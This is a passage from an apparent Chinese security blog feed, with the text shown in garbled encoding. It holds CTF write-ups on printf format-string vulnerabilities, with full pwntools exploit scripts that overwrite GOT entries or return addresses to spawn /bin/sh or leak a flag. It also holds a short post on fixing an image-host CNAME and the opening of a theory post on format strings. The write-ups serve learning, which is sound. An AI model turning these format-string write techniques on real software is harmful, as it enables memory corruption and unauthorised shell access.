+=fmtshort(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,30+i)     prev = (key1 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,31+i)     prev = (key2 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;1111&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1111&#39;)info(&#39;--------change got_table to printf_got:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key3 = 0x14key4 = 0x16for i in range(1):    payload +=fmtbyte(prev,(key3 &gt;&gt; 8*i) &amp; 0xff,87+i)     prev = (key3 &gt;&gt; i*8) &amp; 0xfffor i in range(1):    payload +=fmtbyte(prev,(key4 &gt;&gt; 8*i) &amp; 0xff,85+i)     prev = (key4 &gt;&gt; i*8) &amp; 0xffpayload = payload + &#39;2222&#39;io.sendline(payload)io.recvuntil(&#39;2222&#39;)info(&#39;--------change printf_got to system_addr:-------&#39;)raw_input(&#39;-&gt;&#39;)prev = 0 payload = &quot;&quot;key5 = int(hex(system_addr)[-4:],16)key6 = int(hex(system_addr)[2:6],16)print(&#39;key5 -&gt; &#39; + hex(key5))print(&#39;key6 -&gt; &#39; + hex(key6))for i in range(1):    payload +=fmtshort(prev,(key5 &gt;&gt; 16*i) &amp; 0xffff,17+i)     prev = (key5 &gt;&gt; i*16) &amp; 0xfffffor i in range(1):    payload +=fmtshort(prev,(key6 &gt;&gt; 16*i) &amp; 0xffff,20+i)     prev = (key6 &gt;&gt; i*16) &amp; 0xffffpayload = payload + &#39;3333&#39;io.sendline(payload)sleep(1)io.recvuntil(&#39;3333&#39;)raw_input(&#39;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&#39;)io.sendline(&#39;/bin/sh\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;)io.interactive()</code></pre><p>è¿™ä¸ªexpçš„éš¾ç‚¹åœ¨äºï¼š</p><ul><li>æ³¨æ„å»å®šä½åˆ°åˆé€‚çš„æ ˆç»“æ„å†å»åˆ©ç”¨</li><li>å°½é‡å……åˆ†åˆ©ç”¨æ¯ä¸€æ¬¡çš„printf</li><li>å•æ¬¡printfå¤šæ¬¡å†™å…¥</li><li>æ³¨æ„æ¯æ¬¡ä¼ æ•°æ®è¿‡å»åï¼Œä¸€å®šè¦æ¥æ”¶ä¸€ä¸‹ï¼Œå¹¶ä¸”å†ä¸€æ¬¡çš„æ•°æ®è¯»å…¥è¦é˜²æ­¢bssä¸Šçš„ç¼“å†²åŒºé‡Œé¢å‚æ‚æ•°æ®çš„å½±å“ã€‚<h3 id="ç»“è®ºå’Œæ”¶è·"><a href="#ç»“è®ºå’Œæ”¶è·" class="headerlink" title="ç»“è®ºå’Œæ”¶è·"></a>ç»“è®ºå’Œæ”¶è·</h3></li></ul><p>è¿™ä¸ªé¢˜æ•™ä¼šæˆ‘ä¸€å®šè¦<strong>çµæ´»ã€å……åˆ†çš„åˆ©ç”¨æ ˆä¸Šçš„æ•°æ®</strong>,å•çº¯çš„ebpé“¾åªæ˜¯é€‚åˆç®€å•çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯é¢å¯¹è¿™ç§ä¼šæœ‰éšæœºæ ˆæƒ…å†µçš„é¢˜ç›®ï¼Œå°½é‡è¦æ³¨æ„æœ¬åœ°å’Œè¿œç¨‹çš„ibcç‰ˆæœ¬ã€æ³¨æ„ç¯å¢ƒ,è¿™äº›ä¸ä¸€æ ·å¯¼è‡´æ ˆçš„æƒ…å†µä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼Œå¯¼è‡´expä¹Ÿè¦æœ‰ç›¸åº”çš„å˜åŒ–ã€‚</p><h2 id="xman-2019-format"><a href="#xman-2019-format" class="headerlink" title="xman-2019-format"></a>xman-2019-format</h2><h3 id="ä¿æŠ¤å’Œarch-7"><a href="#ä¿æŠ¤å’Œarch-7" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>CANARY    : disabledFORTIFY   : disabledNX        : ENABLEDPIE       : disabledRELRO     : Partial</code></pre><h3 id="idaåˆ†æ-9"><a href="#idaåˆ†æ-9" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">char *__cdecl sub_80485C4(char *s){  char *v1; // eax  char *result; // eax  puts(&quot;...&quot;);  v1 = strtok(s, &quot;|&quot;);  printf(v1);  while ( 1 )  {    result = strtok(0, &quot;|&quot;);    if ( !result )      break;    printf(result);  }  return result;}</code></pre><p>è¿™é‡Œå› ä¸ºç”¨strtokåšå¤„ç†ï¼Œåªæœ‰ä¸€æ¬¡çš„ä¼ é€æœºä¼šï¼Œpayloadéœ€è¦ç”¨<code>|</code>    åˆ†å‰²æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥å®Œæˆæ¯æ¬¡çš„printfçš„æ¼æ´åˆ©ç”¨ï¼Œç¨å¾®éº»çƒ¦äº†ä¸€ä¸‹ã€‚<br>å¹¶ä¸”å­˜åœ¨åé—¨å‡½æ•°ï¼š</p><pre><code>.text:080485AB                 push    ebp.text:080485AC                 mov     ebp, esp.text:080485AE                 sub     esp, 8.text:080485B1 ; 3:   return system(&quot;/bin/sh&quot;);.text:080485B1                 sub     esp, 0Ch.text:080485B4                 push    offset command  ; &quot;/bin/sh&quot;.text:080485B9                 call    _system.text:080485BE                 add     esp, 10h.text:080485C1                 nop.text:080485C2                 leave.text:080485C3                 retn</code></pre><p>è¿™ä¸‹å¯ä»¥ç›´æ¥æ”¹ret addresså³å¯ã€‚</p><h3 id="gdbåˆ†æ-3"><a href="#gdbåˆ†æ-3" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å…ˆè§‚å¯Ÿä¸€ä¸‹ebpé“¾æ˜¯å¦å­˜åœ¨ ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8H01Yk.png" srcset="/img/loading.gif" alt><br>æ˜¯å­˜åœ¨çš„ï¼Œç„¶åç›´æ¥åˆ©ç”¨å°±å¥½äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/e2PTss.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹ï¼Œåœ¨ç¬¬ä¸€æ¬¡æ”¹ebp2é‡Œé¢çš„å€¼ï¼š 0xffffd338 æ—¶ï¼Œå‘ç°ä¸‹é¢çš„ç¬¬äºŒä¸ªåªéœ€è¦æ”¹ä¸€ä¸ªå­—èŠ‚å³å¯ï¼Œç„¶åç›®æ ‡å°±æ˜¯æ”¹æˆè¿™ä¸ªæ ˆåœ°å€äº†ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/cYhR45.png" srcset="/img/loading.gif" alt><br>ç„¶åæ¥ç€åˆ©ç”¨æ¼æ´ï¼Œæ”¹ä¸€ä¸‹è¿”å›åœ°å€åˆ°åé—¨å‡½æ•°å³å¯ã€‚</p><p>ï¼ˆè¿™ä¸ªé¢˜è‡ªå·±åœ¨åšçš„æ—¶å€™ï¼Œå…ˆæ˜¯è¯•ç€åˆ©ç”¨ç¬¬äºŒä¸ªçš„0xffffd2f8 ï¼Œè¿™ä¸ªé“¾å‘ç°æœ¬åœ°å¯ä»¥æ‰“é€šï¼Œè¿œç¨‹æ˜¯ä¸è¡Œçš„ï¼Œè¿™å°±æ˜¯ç¯å¢ƒå› ç´ äº†ï¼Œè¿œç¨‹ç”±äºlibcç‰ˆæœ¬çš„ä¸åŒï¼Œæ ˆç»“æ„ä¹Ÿæ˜¯ä¸åŒçš„ã€‚æ‰€ä»¥åšé¢˜è¿˜æ˜¯ä¼˜å…ˆï¼Œè€ƒè™‘ebpé“¾ï¼Œç„¶åæ²¡æ³•åˆ©ç”¨äº†ï¼Œåœ¨è€ƒè™‘å……åˆ†åˆ©ç”¨æ ˆæ•°æ®ï¼Œè¿™ä¸ªé€šå¸¸ä¹Ÿæ˜¯å‡ºé¢˜äººç²¾å¿ƒè®¾è®¡çš„æ ˆç»“æ„ï¼Œè®©ä½ æœ‰æ•°æ®å¯ä»¥åˆ©ç”¨ã€‚ï¼‰</p><h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;system_addr = 0x080485B4tag1 = 0x4ctag2 = 0x85abio = process(&#39;./xman_2019_format&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,27012)payload = &#39;%{}c%10$hhn|&#39;.format(0x4c)payload += &#39;%{}c%18$hn~&#39;.format(0x85ab)while True:    try:        io.recvuntil(&#39;...\n...\n&#39;)        io.sendline(payload)        sleep(0.1)        io.recvuntil(&#39;~&#39;)        io.sendline(&#39;ls&#39;)        io.recvline()        io.recvline()        io.interactive()        break    except EOFError :        io.close()        io = process(&#39;./xman_2019_format&#39;)        # io = remote(&#39;node3.buuoj.cn&#39;,27012)</code></pre><p>éœ€è¦çˆ†ç ´æ ˆã€‚</p><h2 id="suctf-2019-playfmt"><a href="#suctf-2019-playfmt" class="headerlink" title="suctf-2019-playfmt"></a>suctf-2019-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-8"><a href="#ä¿æŠ¤å’Œarch-8" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Full RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>å¼€å¯äº†RELROï¼Œè¿™æ ·å°±æ— æ³•got hijackäº†</p><h3 id="idaåˆ†æ-10"><a href="#idaåˆ†æ-10" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/ycZIc7.png" srcset="/img/loading.gif" alt></p><h3 id="gdbåˆ†æ-4"><a href="#gdbåˆ†æ-4" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>ç¨‹åºå…ˆè¯»å…¥äº†flagæ–‡ä»¶ï¼Œè‡ªå·±å¯ä»¥å†™ä¸€ä¸ªflagæ–‡ä»¶æµ‹è¯•ï¼Œå¹¶ä¸”gdbè·Ÿéšï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/TqMvc5.png" srcset="/img/loading.gif" alt><br>å…¶ä¼šè¢«è¯»åˆ°å †ä¸Šã€‚ç´§æ¥ç€è·Ÿåˆ°æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¤„ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/DqFQFq.png" srcset="/img/loading.gif" alt><br>çœ‹ä¸€ä¸‹è¿™ä¸ªå †åœ°å€æ˜¯å¦è¢«ç¨‹åºæ“ä½œä¿®æ”¹äº†ï¼š</p><pre><code>gdb-peda$ x/s 0x8050b700x8050b70:    &quot;flag{f9255a80-e059-4c12-8788-161bf8c6908b}&quot;</code></pre><p>å‘ç°å¹¶æ²¡æœ‰ï¼Œé‚£å°±å¾ˆç®€å•äº†ã€‚æ”»å‡»æ€è·¯å°±æ˜¯ï¼Œåœ¨æ ˆä¸Šæ„é€ å‡ºè¿™ä¸ªå­˜æ”¾flagçš„å †åœ°å€ï¼ˆè®¡ç®—æ–¹å¼å°±æ˜¯åœ¨æ­¤æ—¶çš„æ ˆä¸Šæ‰¾ä¸€ä¸ªåœ°å€æ¥è®¡ç®—åç§»è·å–ï¼‰ã€‚<br>ç¬¬ä¸€æ­¥ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/kOCpje.png" srcset="/img/loading.gif" alt><br>å…ˆä¿®æ”¹ebp2ä¸Šå­˜æ”¾çš„å€¼ï¼Œæ”¹æˆåé¢é‚£ä¸ªæ¡†æ¡†å¯¹åº”çš„æ ˆåœ°å€ï¼Œç„¶ååœ¨åšå¤„ç†ï¼š</p><pre><code>0024| 0xffffd318 --&gt; 0xffffd338 --&gt; 0xffffd348 --&gt; 0x8050ba0 --&gt; 0x0</code></pre><p>æ­¤æ—¶å†ä¿®æ”¹ebp1ä¸Šçš„å€¼ï¼Œæ”¹æˆåˆšåˆšçš„å †åœ°å€ ï¼š</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/0sJJGL.png" srcset="/img/loading.gif" alt><br>è¿™æ ·expå†™çš„æ—¶å€™ï¼Œæ‰¾å¥½åç§»%sä¸€ä¸‹å°±å‡ºæ¥äº†ã€‚</p><h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;# io = remote(&#39;node3.buuoj.cn&#39;,27816)io = process(&#39;./1&#39;)io.recvuntil(&#39;Magic echo Server&#39;)io.recvuntil(&#39;=====================\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)flag = int(io.recv(8),16)print(hex(flag))key = int((hex(flag))[-4:],16) - 32 -12 -4print(&#39;key&#39;+ hex(key))# raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%6$p&#39;)io.recvuntil(&#39;0x&#39;)stack_point = int(io.recv(8),16) + 16tag1 = int((hex(stack_point))[-2:],16)print(hex(tag1))payload  = &#39;%&#39; + str(tag1) + &#39;c%6$hhn&#39; + &#39;1&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;1&#39;)payload = &#39;%&#39; +  str(key &amp; 0xffff) + &#39;c%14$hn&#39; + &#39;2&#39;raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recvuntil(&#39;2&#39;)io.sendline(&#39;%18$s&#39;)io.interactive()</code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>å­¦ä¹ è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</title>
    <link href="/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/"/>
    <url>/2020/03/12/%E4%BF%AE%E5%A4%8D%E4%B8%83%E5%8D%83%E4%BA%91%E5%A4%96%E9%93%BE%E5%A4%B1%E6%95%88/</url>
    
    <content type="html"><![CDATA[<h1 id="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"><a href="#ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ" class="headerlink" title="ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ"></a>ä¿®å¤ä¸ƒåƒäº‘å¤–é“¾å¤±æ•ˆ</h1><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è‡ªå·±çš„ä»¥å‰ç”³è¯·è¿‡ä¸€ä¸ªä¸ƒåƒäº‘åšè‡ªå·±çš„å›¾åºŠï¼Œä»Šæ™šå†™åšå®¢å‘ç°ï¼Œè‡ªå·±ä¸Šä¼ ä¸ä¸Šå›¾ç‰‡ï¼Œå¹¶ä¸”ç”¨upicå¯¼å‡ºæ¥çš„é“¾æ¥æ— æ³•æ˜¾ç¤ºå›¾ç‰‡äº†ã€‚æŸ¥äº†å¾ˆä¹…çš„åŸå› ï¼Œå‘ç°æ˜¯ä¸ƒåƒç‰›åŸæ¥ç»™æˆ‘åˆ†é…çš„å…è´¹å¤–é“¾åŸŸåç»™æˆ‘æ–­ç”¨äº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/78YdoJ.png" srcset="/img/loading.gif" alt><br>å°±æ˜¯è¿™ä¸ªæ²¡äº†ï¼Œè‡ªå·±æ’é”™ï¼Œæ’äº†åŠå¤©æ‰å‘ç°ã€‚æ˜¯åœ¨è¿™é‡Œæ‰¾åˆ°çš„ï¼Œå¥½éšè”½ã€‚ã€‚ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/aeXsve.png" srcset="/img/loading.gif" alt><br>ç„¶åå°±åœ¨æ–‡ä»¶ç®¡ç†é‚£é‡Œå‘ç°ï¼Œç½‘ç«™æç¤ºè¯´å¦‚æœæ— æ³•æ˜¾ç¤ºå›¾ç‰‡ï¼ŒåŠ è½½æ…¢ï¼Œå¯ä»¥åŠ ä¸€ä¸ªåŸŸåã€‚ç„¶åæˆ‘å°±å°è¯•åŠ äº†ä¸€ä¸ªï¼Œç„¶åå°±ä¿®å¤å¥½äº†ã€‚</p><h2 id="ä¿®å¤è¿‡ç¨‹"><a href="#ä¿®å¤è¿‡ç¨‹" class="headerlink" title="ä¿®å¤è¿‡ç¨‹"></a>ä¿®å¤è¿‡ç¨‹</h2><h3 id="ç»‘å®šåˆ›å»ºåŸŸå"><a href="#ç»‘å®šåˆ›å»ºåŸŸå" class="headerlink" title="ç»‘å®šåˆ›å»ºåŸŸå"></a>ç»‘å®šåˆ›å»ºåŸŸå</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/XxkzAY.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/sW0Ju4.png" srcset="/img/loading.gif" alt><br>xxxxä¹Ÿå°±æ˜¯å¡«ä½ çš„åŸŸåï¼Œå‰é¢çš„å¯ä»¥è‡ªå®šä¹‰ã€‚ç‚¹å‡»æ·»åŠ åä¸‹é¢æ€»æ˜¯ä¼šè‡ªåŠ¨åˆå¼¹å‡ºä¸€ä¸ªç©ºç™½çš„æ¡†ï¼Œç‚¹å‡»åé¢çš„åˆ é™¤ï¼Œå¦åˆ™ï¼Œå¾€ä¸‹æ»‘ä½ ä¼šå‘ç°å°±æ˜¯åˆ›å»ºä¸äº†è¿™ä¸ªè®°å½•ã€‚<br>åˆ›å»ºæˆåŠŸåï¼Œä¼šæç¤ºä½ å¤åˆ¶<strong>CNAME</strong>ï¼Œå¤åˆ¶ä¸€ä¸‹ï¼Œå»å¾€ä½ è‡ªå·±çš„åŸŸåç½‘ç«™ï¼Œæˆ‘ç”¨çš„æ˜¯é˜¿é‡Œäº‘ã€‚</p><h3 id="å»è‡ªå·±çš„dnsè§£æå¹³å°"><a href="#å»è‡ªå·±çš„dnsè§£æå¹³å°" class="headerlink" title="å»è‡ªå·±çš„dnsè§£æå¹³å°"></a>å»è‡ªå·±çš„dnsè§£æå¹³å°</h3><p>ï¿¼<br><img src="http://qiqianyun.chumen77.xyz/uPic/meWpeP.png" srcset="/img/loading.gif" alt><br>è¿™é‡Œçš„ä¸»æœºè®°å½•å¡«å…¥åˆšåˆšä½ è‡ªå®šä¹‰çš„ä¸»æœºå¼€å¤´ï¼Œè®°å½•å€¼å¡«å…¥åˆšåˆšå¤åˆ¶çš„CNAMEï¼Œå°±å¯ä»¥äº†ã€‚</p><h3 id="ä¿®æ”¹upicè®¾ç½®"><a href="#ä¿®æ”¹upicè®¾ç½®" class="headerlink" title="ä¿®æ”¹upicè®¾ç½®"></a>ä¿®æ”¹upicè®¾ç½®</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/adszoz.png" srcset="/img/loading.gif" alt><br>å¡«å…¥å³å¯ï¼Œä»¥å‰å†™çš„åšå®¢ï¼Œå›¾ç‰‡çš„é“¾æ¥ä¹Ÿè¦æ”¹ä¸€ä¸‹ï¼Œå°±æ¢å¤åŸæ¥çš„æ ·å­äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>æ‚é¡¹</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</title>
    <link href="/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
    <url>/2020/03/12/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸Šï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®°å½•ä¸€ä¸‹ï¼Œåœ¨å­¦ä¹ è¿™ä¸ªæ¼æ´æ—¶å€™çš„è‡ªå·±æ„Ÿè§‰çš„ç–‘éš¾ç‚¹ï¼Œå’Œåšé¢˜æ—¶å€™çš„ä¸€ç‚¹å°æŠ€å·§ï¼Œè¿™ä¸€ç¯‡ä¸»è¦æ˜¯è®°å½•ç†è®ºã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²</h2><p>åŸºæœ¬æ ¼å¼ï¼š</p><pre><code class="c">%[parameter][flags][field width][.precision][length]type</code></pre><p>éœ€è¦é‡ç‚¹å…³æ³¨çš„patternï¼š</p><ol><li>parameter ï¼šn$ï¼Œè·å–æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸­çš„æŒ‡å®šå‚æ•°</li><li>field width ï¼šè¾“å‡ºçš„æœ€å°å®½åº¦</li><li>precision ï¼šè¾“å‡ºçš„æœ€å¤§é•¿åº¦</li><li>lengthï¼Œè¾“å‡ºçš„é•¿åº¦ : <code>hhï¼Œ1-byte ï¼› hï¼Œ2-byte ï¼› l, 4-byte ï¼›ll,8-byte ï¼›</code></li><li>type :<pre><code class="c"> d/iï¼Œæœ‰ç¬¦å·æ•´æ•° uï¼Œæ— ç¬¦å·æ•´æ•° x/Xï¼Œ16 è¿›åˆ¶ unsigned int ã€‚x ä½¿ç”¨å°å†™å­—æ¯ï¼›X ä½¿ç”¨å¤§å†™å­—æ¯. sï¼Œè¾“å‡ºä»¥null ç»“å°¾å­—ç¬¦ä¸²ç›´åˆ°ç²¾åº¦è§„å®šçš„ä¸Šé™ï¼›å¦‚æœæ²¡æœ‰æŒ‡å®šç²¾åº¦ï¼Œåˆ™è¾“å‡ºæ‰€æœ‰å­—èŠ‚ã€‚ cï¼ŒæŠŠ int å‚æ•°è½¬ä¸º unsigned char å‹è¾“å‡º pï¼Œ void * å‹ï¼Œè¾“å‡ºå¯¹åº”å˜é‡çš„å€¼ã€‚printf(&quot;%p&quot;,a) ç”¨åœ°å€çš„æ ¼å¼æ‰“å°å˜é‡ a çš„å€¼ï¼Œprintf(&quot;%p&quot;, &amp;a) æ‰“å°å˜é‡ a æ‰€åœ¨çš„åœ°å€ã€‚ nï¼Œä¸è¾“å‡ºå­—ç¬¦ï¼Œä½†æ˜¯æŠŠå·²ç»æˆåŠŸè¾“å‡ºçš„å­—ç¬¦ä¸ªæ•°å†™å…¥å¯¹åº”çš„æ•´å‹æŒ‡é’ˆå‚æ•°æ‰€æŒ‡çš„å˜é‡ã€‚ï¼ˆä»…ä»…æ˜¯åœ¨è¿™ä¸€ä¸ªprintfçš„å‡½æ•°ï¼‰ %ï¼Œ &#39;%&#39;å­—é¢å€¼ï¼Œä¸æ¥å—ä»»ä½• flags, widthã€‚</code></pre></li></ol><p>å‚æ•°ï¼šå°±æ˜¯æ˜¯è¦å¯¹åº”è¾“å‡ºçš„å˜é‡ã€‚</p><h2 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åŸç†</h2><p>æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ˜¯æ ¹æ®æ ¼å¼åŒ–å­—ç¬¦ä¸²å‡½æ•°æ¥è¿›è¡Œè§£æçš„ã€‚é‚£ä¹ˆç›¸åº”çš„è¦è¢«è§£æçš„å‚æ•°çš„ä¸ªæ•°ä¹Ÿè‡ªç„¶æ˜¯ç”±è¿™ä¸ª<strong>æ ¼å¼åŒ–å­—ç¬¦ä¸²</strong>æ‰€æ§åˆ¶ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/PnScRI.png" srcset="/img/loading.gif" alt></p><p>æ ¹æ® <strong>cdecl çš„è°ƒç”¨çº¦å®š</strong>,åœ¨è¿›å…¥ printf()  å‡½æ•°ä¹‹å‰,å°†å‚æ•°ä»å³åˆ°å·¦ä¾æ¬¡å‹æ ˆã€‚è¿›å…¥printf()  ä¹‹å,å‡½æ•°é¦–å…ˆè·å–ç¬¬ä¸€ä¸ªå‚æ•°,ä¸€æ¬¡è¯»å–ä¸€ä¸ªå­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸æ˜¯    % ,å­—ç¬¦ç›´æ¥å¤åˆ¶åˆ°è¾“å‡ºä¸­ã€‚å¦åˆ™,è¯»å–ä¸‹ä¸€ä¸ªéç©ºå­—ç¬¦,è·å–ç›¸åº”çš„å‚æ•°å¹¶è§£æè¾“å‡ºã€‚<br>å¦‚ä¸Šå›¾ä¸€æ ·ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‚æ•°ä¸åé¢å®é™…æä¾›çš„æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œå°±ä¸ä¼šå‡ºç°ä»€ä¹ˆé—®é¢˜ï¼Œä½†å¦‚æœåœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å¤šåŠ å‡ ä¸ªæ ¼å¼åŒ–å­—ç¬¦çš„æ—¶å€™ï¼Œç¨‹åºä¼šæ€ä¹ˆåŠå‘¢ï¼Ÿ<strong>æ­¤æ—¶å…¶å¯ä»¥æ­£å¸¸é€šè¿‡ç¼–è¯‘ï¼Œå¹¶ä¸”åœ¨æ ˆä¸Šå–å€¼ï¼ŒæŒ‰ç…§ç»™çš„æ ¼å¼åŒ–å­—ç¬¦æ¥è§£æå¯¹åº”æ ˆä¸Šçš„å€¼ã€‚æ­¤æ—¶ä¹Ÿå°±å‘ç”Ÿäº†æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚</strong></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="æ³„éœ²å†…å­˜æ•°æ®"><a href="#æ³„éœ²å†…å­˜æ•°æ®" class="headerlink" title="æ³„éœ²å†…å­˜æ•°æ®"></a>æ³„éœ²å†…å­˜æ•°æ®</h3><h4 id="æ ˆä¸Šçš„æ•°æ®"><a href="#æ ˆä¸Šçš„æ•°æ®" class="headerlink" title="æ ˆä¸Šçš„æ•°æ®"></a>æ ˆä¸Šçš„æ•°æ®</h4><ol><li>åˆ©ç”¨ % order $ p / % order x æ¥è·å–æŒ‡å®šå‚æ•°å¯¹åº”æ ˆçš„å†…å­˜å€¼ ã€‚(å¸¸ç”¨%p)</li><li>åˆ©ç”¨ % order $ s æ¥è·å–æŒ‡å®šå˜é‡æ‰€å¯¹åº”åœ°å€çš„å†…å®¹ï¼Œåªä¸è¿‡æœ‰é›¶æˆªæ–­ã€‚(è¿™ä¸ªåœ¨åšæŸäº›ctfé¢˜å¾ˆå¥½ç”¨ï¼Œå½“ä¸€ä¸ªç¨‹åºä¸Šæ¥è¯»å–ä¸€ä¸ªflagåˆ°ä¸€ä¸ªä½ç½®ï¼Œç„¶åä½ åœ¨æ ˆä¸Šæ„é€ è¿™ä¸ªä½ç½®ï¼Œç›´æ¥%så°±å‡ºæ¥flagäº†ã€‚)<h4 id="ä»»æ„åœ°å€å†…å­˜"><a href="#ä»»æ„åœ°å€å†…å­˜" class="headerlink" title="ä»»æ„åœ°å€å†…å­˜"></a>ä»»æ„åœ°å€å†…å­˜</h4>å½“æƒ³æ³„éœ²ä»»æ„åœ°å€å†…å­˜çš„æ—¶å€™ï¼Œå°±éœ€è¦<strong>æƒ³åŠæ³•æŠŠåœ°å€å†™å…¥æ ˆä¸­</strong>ã€‚<br>åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹Ÿæ˜¯å­˜åœ¨æ ˆä¸Šçš„ï¼Œå½“å¯æ§çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç›´æ¥æŠŠæŸä¸ªåœ°å€å†™åˆ°è¿™ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸Šï¼Œç„¶åæ‰¾ä¸‹åœ¨è¿™ä¸ªprintfå‡½æ•°ä¸­<strong>å¯¹åº”çš„æ ˆåç§»</strong>ï¼Œç„¶ååœ¨ç”¨ä½ æƒ³ç”¨çš„æ 